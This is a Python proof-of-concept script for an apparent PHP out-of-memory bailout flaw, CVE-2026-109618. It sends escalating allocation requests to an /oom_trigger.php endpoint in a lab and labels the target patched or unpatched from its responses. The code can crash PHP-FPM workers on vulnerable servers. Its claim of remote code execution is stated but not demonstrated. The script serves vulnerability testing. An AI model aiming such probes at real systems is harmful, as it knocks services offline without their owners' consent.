#!/usr/bin/env python3
"""
cve_109618.py  -  CVE-2026-109618 OOM / Zend Bailout PoC
==========================================================
Author: l3tchupkt (https://github.com/l3tchupkt)

THE ACTUAL BUG (PHP source commit 31c0ea7d, Zend/zend_alloc.c):

  PHP's Zend Memory Manager used longjmp() (via zend_bailout()) to unwind
  out-of-memory conditions. When memory_limit is exceeded mid-allocation:

    1. Allocate container struct A            [succeeds, linked into GC list]
    2. Allocate sub-buffer A->buffer          [FAILS — OOM]
    3. zend_bailout() -> longjmp() fires
    4. Shutdown routines walk GC list, find A
    5. Call destructor on A->buffer           [UNINITIALIZED -> corruption -> RCE]

  THE FIX (8.4.27):
    a) Converted allocation sites from non-fallible emalloc() to new fallible
       API — returns NULL on OOM -> catchable E_ERROR instead of longjmp.
    b) New hard_limit (2 * memory_limit): allocations that truly cannot be
       made fallible call _exit(137) instead of corrupting memory.

OBSERVABLE DIFFERENCE (from PHP issue #24492, confirmed in the wild):
  UNPATCHED (8.4.26):  large alloc -> OOM -> zend_bailout -> corruption path
                        (connection-reset or PHP-FPM crash, no graceful error)
  PATCHED   (8.4.27):
    - fallible path  -> PHP raises catchable "Allowed memory exhausted" (HTTP 200/500)
    - hard-limit hit -> FPM worker calls _exit(137) -> nginx returns 502

APPROACH:
  Uses /oom_trigger.php (deployed in the lab) which calls:
      sprintf("%{N}s", "x")    -- single non-fallible large allocation
  This is the exact repro from PHP issue #24492 (VijhnAustin, Oct 2026).
  N is chosen to exceed memory_limit so OOM fires inside PHP rather than
  being blocked by nginx's client_max_body_size.

USAGE:
  python3 cve_109618.py -t http://localhost:8080
  python3 cve_109618.py -t http://localhost:8080 --mem-limit 64
  python3 cve_109618.py -t http://localhost:8080 -v
"""

import argparse
import sys
import time

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

__version__ = "1.0.0"
__author__  = "l3tchupkt"
__github__  = "https://github.com/l3tchupkt"

BANNER = (
    "\n"
    "  ============================================\n"
    "  CVE-2026-109618 - Zend OOM Bailout PoC\n"
    "  PHP Allocator: fallible vs longjmp probe\n"
    "  Author: l3tchupkt (https://github.com/l3tchupkt)\n"
    "  ============================================\n"
)


def http_client():
    s = requests.Session()
    s.verify = False
    s.headers["User-Agent"] = "php2shell-cve109618/1.0"
    return s


def probe_oom(base, mb, verbose):
    """
    Hit /oom_trigger.php?mb=<N> and classify the result.

    Returns: (status_code, classification, detail)
      classification is one of:
        OK             - request succeeded, no OOM (under limit)
        CATCHABLE_OOM  - PHP raised catchable memory error (patched fallible alloc)
        HARD_LIMIT_HIT - FPM worker killed via _exit(137), nginx returned 502/503
        CRASH_BAILOUT  - connection reset without error (unpatched longjmp path)
        TIMEOUT        - no response in time
    """
    url = f"{base}/oom_trigger.php"
    params = {"mb": mb}

    if verbose:
        print(f"  -> Probing {mb}M allocation via {url} ...")

    http = http_client()
    try:
        r = http.get(url, params=params, timeout=25)
        status = r.status_code
        body   = r.text.lower()

        if status == 200:
            if "memory" in body or "exhausted" in body:
                return status, "CATCHABLE_OOM", r.text[:300]
            return status, "OK", r.text[:200]

        elif status in (500, 503):
            if "memory" in body or "exhausted" in body:
                return status, "CATCHABLE_OOM", r.text[:300]
            return status, "HARD_LIMIT_HIT", f"HTTP {status}"

        elif status == 502:
            # FPM worker died -> nginx returned 502
            return status, "HARD_LIMIT_HIT", "FPM worker killed (_exit 137)"

        else:
            return status, "OK", f"HTTP {status}"

    except requests.exceptions.ConnectionError:
        return None, "CRASH_BAILOUT", "Connection reset — longjmp/bailout path"
    except requests.exceptions.Timeout:
        return None, "TIMEOUT", "No response within timeout"
    except Exception as exc:
        return None, "CRASH_BAILOUT", str(exc)


def run_cve109618(base, mem_limit_mb, verbose):
    # We probe at: 50%, 75%, 100%, 150%, 210% of memory_limit
    # Hard limit fires at ~200% (2x memory_limit in patched PHP)
    probes_mb = [
        int(mem_limit_mb * 0.50),
        int(mem_limit_mb * 0.75),
        int(mem_limit_mb * 1.00),
        int(mem_limit_mb * 1.50),
        int(mem_limit_mb * 2.10),
    ]
    # Remove duplicates, ensure > 0
    probes_mb = sorted(set(max(1, x) for x in probes_mb))

    print(f"[*] Target       : {base}/oom_trigger.php")
    print(f"[*] memory_limit : {mem_limit_mb}M  (hard limit ~{mem_limit_mb * 2}M on 8.4.27)")
    print(f"[*] Probe sizes  : {probes_mb} MB")
    print()
    print(f"  {'Alloc':>8} | {'HTTP':>4} | {'Result':<20} | Details")
    print("  " + "-" * 70)

    results = []
    for mb in probes_mb:
        status, classification, detail = probe_oom(base, mb, verbose)
        status_str = str(status) if status else "---"

        interp = {
            "OK":            "Under limit, request succeeded",
            "CATCHABLE_OOM": "PATCHED: fallible alloc -> catchable E_ERROR",
            "HARD_LIMIT_HIT":"PATCHED: hard limit (_exit 137) -> FPM worker killed",
            "CRASH_BAILOUT": "POTENTIALLY VULNERABLE: connection reset (longjmp path?)",
            "TIMEOUT":       "No response within timeout",
        }.get(classification, classification)

        print(f"  {mb:>6}M    | {status_str:>4} | {classification:<20} | {interp}")
        results.append((mb, status, classification, detail))

        if classification in ("CRASH_BAILOUT", "HARD_LIMIT_HIT"):
            # Don't keep hammering after first crash-class
            break

        time.sleep(0.8)

    print()
    print("=" * 62)

    crashes   = [r for r in results if r[2] == "CRASH_BAILOUT"]
    hard_hits = [r for r in results if r[2] == "HARD_LIMIT_HIT"]
    catchable = [r for r in results if r[2] == "CATCHABLE_OOM"]

    if crashes:
        print(f"\n  [+] CRASH_BAILOUT at {crashes[0][0]}M")
        print("      Connection was reset without a graceful PHP error.")
        print("      On UNPATCHED PHP (< 8.4.27): this is the OOM longjmp path.")
        print("      zend_bailout() races through partially-initialised allocator")
        print("      structures -> memory corruption -> CVE-2026-109618.")
        print("      Upgrade to PHP >= 8.4.27 immediately.")
        print(f"\n      Detail: {crashes[0][3]}")
    elif hard_hits:
        print(f"\n  [=] HARD_LIMIT_HIT at {hard_hits[0][0]}M")
        print("      PHP FPM worker exited via _exit(137) — the new hard memory limit.")
        print("      This is the PATCHED behaviour of CVE-2026-109618.")
        print("      The fallible allocator prevented the longjmp corruption path.")
        print("      Note: _exit(137) is a regression tradeoff vs graceful OOM.")
        print(f"\n      Detail: {hard_hits[0][3]}")
    elif catchable:
        print(f"\n  [=] CATCHABLE_OOM at {catchable[0][0]}M")
        print("      PHP raised a catchable E_ERROR for memory exhaustion.")
        print("      The fallible allocator returned NULL instead of longjmp-ing.")
        print("      This is PATCHED CVE-2026-109618 behaviour.")
        print(f"\n      Detail: {catchable[0][3][:200]}")
    else:
        print("\n  [?] No OOM triggered with these probe sizes.")
        print(f"      PHP memory_limit in container may differ from {mem_limit_mb}M.")
        print("      Try: --mem-limit <actual_limit>")
        print("      Check: docker exec <ctr> php -i | grep memory_limit")

    print()
    return bool(crashes)


def main():
    ap = argparse.ArgumentParser(
        description="CVE-2026-109618 - Zend OOM Bailout / Hard-Limit Stress PoC",
        epilog=(
            "examples:\n"
            "  %(prog)s -t http://localhost:8080\n"
            "  %(prog)s -t http://localhost:8080 --mem-limit 64\n"
            "  %(prog)s -t http://localhost:8080 -v\n"
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    ap.add_argument("-t", "--target",    required=True,
                    help="Base URL (e.g. http://localhost:8080)")
    ap.add_argument("--mem-limit", type=int, default=128,
                    help="PHP memory_limit in MB (default: 128)")
    ap.add_argument("-v", "--verbose",   action="store_true")
    args = ap.parse_args()

    print(BANNER)
    print("[*] Distinguishes unpatched (longjmp/bailout) from patched")
    print("    (fallible alloc / hard-limit _exit 137) OOM behaviour.")
    print("[*] Uses /oom_trigger.php (sprintf large alloc — PHP issue #24492 repro)")
    print()

    run_cve109618(args.target.rstrip("/"), args.mem_limit, args.verbose)


if __name__ == "__main__":
    main()
